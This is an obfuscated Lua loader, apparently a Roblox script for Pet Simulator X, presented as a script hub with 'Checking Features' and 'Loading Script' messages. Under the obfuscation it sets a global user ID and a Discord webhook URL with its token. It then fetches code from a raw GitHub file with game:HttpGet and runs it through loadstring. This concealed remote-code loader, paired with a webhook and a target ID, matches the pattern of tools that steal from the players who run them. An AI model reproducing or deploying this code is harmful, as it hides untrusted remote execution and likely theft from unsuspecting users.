--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v75=0;local v76;while true do if (v75==0) then v76=v2(v0(v30,16));if v19 then local v100=0;local v101;while true do if (v100==1) then return v101;end if (v100==0) then v101=v5(v76,v19);v19=nil;v100=1;end end else return v76;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v77=0 -0 ;local v78;while true do if (v77==(1065 -(68 + 997))) then v78=(v31/(((1275 -(226 + 1044)) -(12 -9))^(v32-(1 -0))))%((4 -2)^(((v33-((737 -(32 + 85)) -(555 + 64))) -(v32-(932 -(857 + 74)))) + (569 -(367 + 201)))) ;return v78-(v78%(928 -(214 + 699 + 14))) ;end end else local v79=0 + 0 + 0 ;local v80;while true do if (v79==(0 + 0)) then v80=(879 -(282 + 595))^(v32-(1638 -(1523 + 114))) ;return (((v31%(v80 + v80))>=v80) and (1 + 0)) or (0 -0) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=957 -((1072 -(67 + 113)) + 65) ;local v36;local v37;while true do if (v35==(2 -1)) then return (v37 * 256) + v36 ;end if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + (3 -1) );v18=v18 + 2 ;v35=351 -(87 + 193 + 70) ;end end end local function v23()local v38=0 -0 ;local v39;local v40;local v41;local v42;while true do if (v38==(1 + 0)) then return (v42 * (30433252 -13656036)) + (v41 * ((108223 -60520) + 17833)) + (v40 * (1253 -((2001 -1086) + 82))) + v39 ;end if (v38==(0 -0)) then v39,v40,v41,v42=v1(v16,v18,v18 + 2 + 1 + 0 );v18=v18 + (956 -(802 + 150)) ;v38=2 -1 ;end end end local function v24()local v43=0 -0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==1) then v46=1 + 0 ;v47=(v20(v45,792 -((653 -285) + 423) ,62 -(1122 -(1020 + 60)) ) * (((1443 -(630 + 793)) -(10 + 8))^(122 -(304 -214)))) + v44 ;v43=(2102 -1658) -(416 + 26) ;end if (v43==(9 -6)) then if (v48==(0 + 0)) then if (v47==(0 -0)) then return v49 * (438 -(58 + 87 + (1008 -715))) ;else v48=431 -((1791 -(760 + 987)) + 386) ;v46=1486 -((2911 -(1789 + 124)) + 488) ;end elseif (v48==(651 + 1396)) then return ((v47==(0 + 0)) and (v49 * (1/(772 -(201 + 571))))) or (v49 * NaN) ;end return v8(v49,v48-(2161 -(116 + 1022)) ) * (v46 + (v47/(((774 -(745 + 21)) -6)^(31 + 21)))) ;end if (v43==(7 -5)) then v48=v20(v45,74 -53 ,31);v49=((v20(v45,891 -(814 + 45) )==(2 -1)) and  -(1 + 0)) or 1 ;v43=2 + 1 + 0 ;end if (v43==0) then v44=v23();v45=v23();v43=886 -(261 + 624) ;end end end local function v25(v50)local v51;if  not v50 then v50=v23();if (v50==(0 -0)) then return "";end end v51=v3(v16,v18,(v18 + v50) -(3 -2) );v18=v18 + v50 ;local v52={};for v68=1 + 0 , #v51 do v52[v68]=v2(v1(v3(v51,v68,v68)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0 -0 ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v53~=4) then else while true do if (v54==(3 + 0)) then v61=nil;while true do local v102=0 + 0 ;while true do if (v102~=(0 -0)) then else if (v55==(3 + 0)) then local v103=65 -(30 + 35) ;local v104;while true do if ((0 -0)==v103) then v104=0 -0 ;while true do if (v104==(1700 -(1419 + 281))) then local v122=0;while true do if (0~=v122) then else for v149=1,v23() do v57[v149-(1 -0) ]=v28();end for v151=1,v23() do v58[v151]=v23();end v122=3 -2 ;end if ((1213 -(323 + 889))==v122) then v104=75 -(71 + 3) ;break;end end end if (v104~=1) then else return v59;end end break;end end end if (v55==1) then local v105=0;while true do if (v105~=(0 -0)) then else v59={v56,v57,nil,v58};v60=v23();v105=1;end if (v105==1) then v61={};v55=243 -(187 + 54) ;break;end end end v102=1;end if (v102==(781 -(162 + 618))) then if ((2 + 0)~=v55) then else for v109=983 -(18 + 964) ,v60 do local v110=0 + 0 ;local v111;local v112;local v113;while true do if (v110==(0 -0)) then v111=0 -0 ;v112=nil;v110=1;end if (v110~=1) then else v113=nil;while true do if (v111==(1 + 0)) then if (v112==1) then v113=v21()~=(1636 -(1373 + 263)) ;elseif (v112==(852 -(20 + 830))) then v113=v24();elseif (v112~=3) then else v113=v25();end v61[v109]=v113;break;end if (v111~=0) then else local v135=0;while true do if (v135==(1001 -(451 + 549))) then v111=127 -(116 + 10) ;break;end if ((0 + 0)==v135) then local v153=0;while true do if (v153~=(0 -0)) then else v112=v21();v113=nil;v153=1 -0 ;end if (v153==(1 + 0)) then v135=1;break;end end end end end end break;end end end v59[4 -1 ]=v21();for v114=1 + 0 ,v23() do local v115=1384 -(746 + 638) ;local v116;local v117;local v118;local v119;while true do if (v115==(0 + 0)) then v116=0 + 0 ;v117=nil;v115=1;end if (v115~=(2 -0)) then else while true do if (v116==(341 -(218 + 123))) then local v136=0;while true do if ((0 -0)~=v136) then else v117=1551 -(1126 + 425) ;v118=nil;v136=1;end if (v136==(406 -(118 + 287))) then v116=3 -2 ;break;end end end if ((1122 -(118 + 1003))~=v116) then else v119=nil;while true do if (v117~=1) then else while true do if (v118==0) then v119=v21();if (v20(v119,1582 -(1535 + 46) ,1)==(377 -(142 + 235))) then local v163=0 -0 ;local v164;local v165;local v166;local v167;while true do if (v163~=(0 + 0)) then else v164=977 -(553 + 424) ;v165=nil;v163=1 -0 ;end if (v163==(2 + 0)) then while true do if (v164==1) then local v176=0;while true do if (v176~=(0 + 0)) then else v167={v22(),v22(),nil,nil};if (v165==(0 -0)) then local v186=0 + 0 ;local v187;while true do if (v186==(1467 -(899 + 568))) then v187=0 -0 ;while true do if (v187~=(0 -0)) then else v167[2 + 1 ]=v22();v167[4]=v22();break;end end break;end end elseif (v165==1) then v167[3]=v23();elseif (v165==(4 -2)) then v167[1 + 2 ]=v23() -((9 -7)^16) ;elseif (v165==(7 -4)) then local v192=753 -(239 + 514) ;while true do if (v192~=(603 -(268 + 335))) then else v167[293 -(60 + 230) ]=v23() -((574 -(426 + 146))^(2 + 14)) ;v167[1460 -(282 + 1174) ]=v22();break;end end end v176=1 + 0 ;end if (v176~=(812 -(569 + 242))) then else v164=2;break;end end end if (v164~=(5 -3)) then else if (v20(v166,1203 -(373 + 829) ,1 + 0 )==(1025 -(706 + 318))) then v167[1253 -(721 + 530) ]=v61[v167[2 + 0 ]];end if (v20(v166,1273 -(945 + 326) ,4 -2 )==1) then v167[5 -2 ]=v61[v167[3]];end v164=3 + 0 ;end if (0==v164) then local v177=700 -(271 + 429) ;local v178;while true do if (v177~=(0 + 0)) then else v178=0;while true do if (v178==(1500 -(1408 + 92))) then v165=v20(v119,1088 -(461 + 625) ,1291 -(993 + 295) );v166=v20(v119,1 + 3 ,1177 -(418 + 753) );v178=1 + 0 ;end if (v178==(1 + 0)) then v164=1 + 0 ;break;end end break;end end end if (v164==(1 + 2)) then if (v20(v166,1 + 2 ,8 -5 )==1) then v167[533 -(406 + 123) ]=v61[v167[1773 -(1749 + 20) ]];end v56[v114]=v167;break;end end break;end if (v163~=(1 + 0)) then else v166=nil;v167=nil;v163=1324 -(1249 + 73) ;end end end break;end end break;end if (0~=v117) then else local v154=0 + 0 ;while true do if (v154==(1146 -(466 + 679))) then v117=1;break;end if (v154~=0) then else v118=0 -0 ;v119=nil;v154=2 -1 ;end end end end break;end end break;end if (v115==(1901 -(106 + 1794))) then v118=nil;v119=nil;v115=1 + 1 ;end end end v55=1 + 2 ;end if (v55==(0 -0)) then local v107=0 -0 ;while true do if (v107==(0 -0)) then v56={};v57={};v107=115 -(4 + 110) ;end if ((585 -(57 + 527))~=v107) then else v58={};v55=1428 -(41 + 1386) ;break;end end end break;end end end break;end if (v54==2) then v59=nil;v60=nil;v54=4 -1 ;end if (v54~=0) then else v55=103 -(17 + 86) ;v56=nil;v54=1 + 0 ;end if (v54==(1 -0)) then v57=nil;v58=nil;v54=2;end end break;end if (v53==0) then v54=0 -0 ;v55=nil;v53=1 + 0 ;end if (v53~=(168 -(122 + 44))) then else v58=nil;v59=nil;v53=1004 -(938 + 63) ;end if (v53==(3 + 0)) then v60=nil;v61=nil;v53=4;end if (v53~=(1 -0)) then else v56=nil;v57=nil;v53=6 -4 ;end end end local function v29(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v70=1;local v71= -1;local v72={...};local v73=v12("#",...) -1 ;local function v74()local v81=v65;local v82=v66;local v83=v67;local v84=v27;local v85={};local v86={};local v87={};for v91=1125 -(936 + 189) ,v73 do if ((v91>=v83) or ((680 + 1385)>=(4809 -(1565 + 48)))) then v85[v91-v83 ]=v72[v91 + 1 + 0 ];else v87[v91]=v72[v91 + 1 ];end end local v88=(v73-v83) + 1 ;local v89;local v90;while true do local v92=1138 -(782 + 356) ;local v93;local v94;while true do if (((267 -(176 + 91))==v92) or ((11400 -7024)<=(2182 -701))) then v93=1092 -(975 + 117) ;v94=nil;v92=1876 -(157 + 1718) ;end if ((v92==(1 + 0)) or ((12041 -8649)>=(16208 -11467))) then while true do if ((3325>=(3172 -(697 + 321))) and (v93==(0 -0))) then v94=0 -0 ;while true do if ((v94==(0 -0)) or ((505 + 790)>=(6057 -2824))) then local v108=(1836 -(1045 + 791)) -0 ;while true do if ((4377>((7261 -4392) -(322 + 905))) and (v108==(612 -(602 + 9)))) then v94=1190 -(449 + 740) ;break;end if (((5595 -(826 + 46))>(2303 -(245 + (1071 -369)))) and (v108==0)) then v89=v81[v70];v90=v89[3 -2 ];v108=1;end end end if ((v94==(1 + (505 -(351 + 154)))) or ((6034 -(260 + 1638))<=3433)) then if ((((6259 -(1281 + 293)) -(382 + 58))<=4631) and (v90<=4)) then if (((13717 -9441)>=(3253 + 661)) and (v90<=1)) then if (((408 -210)<=(12975 -8610)) and (v90>0)) then v70=v89[1208 -(902 + 303) ];else local v124=0;local v125;local v126;while true do if (((10499 -(5983 -(28 + 238)))>(11261 -6585)) and (v124==(0 + 0))) then v125=1690 -(1121 + (1270 -701)) ;v126=nil;v124=215 -(22 + 192) ;end if ((4864>((4439 -(1381 + 178)) -(483 + 188 + 12))) and (v124==((1181 + 283) -(1404 + 26 + 33)))) then while true do if ((v125==(0 -(0 -0))) or ((4972 -1272)==(3272 -(468 + 297)))) then v126=v89[564 -(334 + 228) ];v87[v126]=v87[v126](v13(v87,v126 + (3 -2) ,v71));break;end end break;end end end elseif (((10369 -5895)>=((257 + 239) -222)) and (v90<=(1 + 1))) then local v127=236 -(141 + 95) ;local v128;local v129;local v130;local v131;while true do if ((v127==(1 + 0)) or (1894<=((4088 -(381 + 89)) -2212))) then v130=nil;v131=nil;v127=4 -2 ;end if (((369 + 1203)>=(4194 -(2362 + 301))) and (v127==(2 + 0))) then while true do if (((0 + 0)==v128) or ((6599 -1912)<(2680 + 1862))) then local v158=163 -(92 + 71) ;while true do if (((1626 + 1665)>1667) and (v158==0)) then v129=0 -0 ;v130=nil;v158=1 + 0 ;end if ((v158==1) or (873==(2799 -(574 + 191)))) then v128=1 + 0 ;break;end end end if ((1==v128) or (2816<(27 -16))) then v131=nil;while true do if (((1890 + 1809)<(5555 -(254 + (1019 -424)))) and (v129==(127 -(55 + 71)))) then v87[v130 + (1 -(1156 -(1074 + 82))) ]=v131;v87[v130]=v131[v89[1794 -(573 + 1217) ]];break;end if (((7327 -4681)>=(67 + 809)) and (v129==(0 -0))) then local v171=939 -(714 + 225) ;while true do if (((1794 -1180)<=(4438 -1254)) and ((0 + 0)==v171)) then v130=v89[2 -0 ];v131=v87[v89[809 -(118 + 688) ]];v171=49 -(25 + 23) ;end if (((606 + 2520)==3126) and ((1887 -(927 + 959))==v171)) then v129=3 -2 ;break;end end end end break;end end break;end if ((v127==(732 -(16 + 716))) or (2187>=(9562 -(10098 -5490)))) then v128=97 -(11 + 86) ;v129=nil;v127=2 -1 ;end end elseif ((v90>(288 -(175 + 110))) or (3877==(9025 -5450))) then v87[v89[9 -7 ]]=v64[v89[(3583 -(214 + 1570)) -(503 + 1293) ]];else v87[v89[2]]=v89[8 -(1460 -(990 + 465)) ];end elseif (((512 + 195)>((698 + 995) -(810 + 251))) and (v90<=(3 + 2 + 2))) then if ((v90<=(2 + 3 + 0)) or (546>=(2420 + 264))) then v87[v89[535 -(43 + 490) ]][v89[736 -(711 + 22) ]]=v89[15 -(43 -32) ];elseif (((2324 -(240 + 619))<=4301) and (v90==6)) then do return;end else local v141=0;local v142;local v143;local v144;local v145;while true do if (((412 + 1292)>(2266 -841)) and (v141==(0 + 0))) then local v155=(3470 -(1668 + 58)) -(1344 + 400) ;while true do if ((v155==1) or (687==(4639 -(255 + 150)))) then v141=1 + 0 ;break;end if ((v155==0) or ((1783 + 1547)<1429)) then v142=v89[8 -(632 -(512 + 114)) ];v143,v144=v84(v87[v142](v13(v87,v142 + 1 ,v89[(23 -14) -6 ])));v155=1740 -(404 + 1335) ;end end end if (((1553 -(183 + 223))>=(407 -72)) and ((1 + (0 -0))==v141)) then v71=(v144 + v142) -1 ;v145=(0 -0) + 0 ;v141=339 -(10 + 327) ;end if (((1599 + 1836)>(274 + 1187 + 636)) and (v141==(340 -(118 + 220)))) then for v159=v142,v71 do local v160=0 + 0 ;local v161;while true do if ((v160==(449 -(108 + 341))) or ((1694 + 2076)>=(17084 -13043))) then v161=1493 -(711 + 782) ;while true do if ((v161==(0 -(0 + 0))) or (3791<=1611)) then v145=v145 + 1 ;v87[v159]=v143[v145];break;end end break;end end end break;end end end elseif ((v90<=(477 -(270 + 199))) or ((15441 -10863)<=(651 + 1357))) then if ((1125<=(3895 -(580 + 1239))) and (v87[v89[5 -3 ]]==v89[(1998 -(109 + 1885)) + 0 ])) then v70=v70 + 1 + 0 ;else v70=v89[2 + (1470 -(1269 + 200)) ];end elseif ((v90==(22 -(24 -11))) or ((462 + 281)>=(5566 -(645 + 522)))) then v87[v89[1792 -(1010 + 780) ]]();else v64[v89[3 + 0 ]]=v87[v89[9 -7 ]];end v70=v70 + (2 -1) ;break;end end break;end end break;end end end end A,B=v27(v11(v74));if  not A[1] then local v95=v62[4][v70] or "?" ;error("Script error at ["   .. v95   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!173O00028O00027O004003023O005F4703053O00546578743203143O00436865636B696E672046656174757265733O2E03053O00546578743303153O004C2O6F6B696E6720666F7220492O737565733O2E026O00084003063O00557365724964022O0060409405E74103073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31302O39343031303732342O39342O393038392F58514F394466726E6C67587A4C584B615552627461456169613554743944686A366E6550616F654B337751695A775A30565477786456715A39356F736778453357495845026O00F03F03053O005465787434030C3O00412O6C20446F6E653O2E21030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D78676D2E6C756103103O00437573746F6D5363726970744E616D6503093O00532O63656E2048756203053O00546578743103113O004C6F6164696E67205363726970743O2E00243O0012033O00013O0026083O0008000100020004013O00080001001204000100033O003005000100040005001204000100033O0030050001000600070012033O00083O0026083O000F000100010004013O000F00010012030001000A3O00120A000100093O0012030001000C3O00120A0001000B3O0012033O000D3O0026083O001B000100080004013O001B0001001204000100033O0030050001000E000F001204000100103O001204000200113O002002000200020012001203000400134O0007000200046O00013O00022O00090001000100010004013O002300010026083O00010001000D0004013O00010001001204000100033O003005000100140015001204000100033O0030050001001600170012033O00023O0004013O000100012O00063O00017O00243O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000E3O000E3O000F3O000F3O00103O00103O00103O00103O00103O00103O00103O00113O00133O00133O00143O00143O00153O00153O00163O00173O00193O00",v9(),...);end
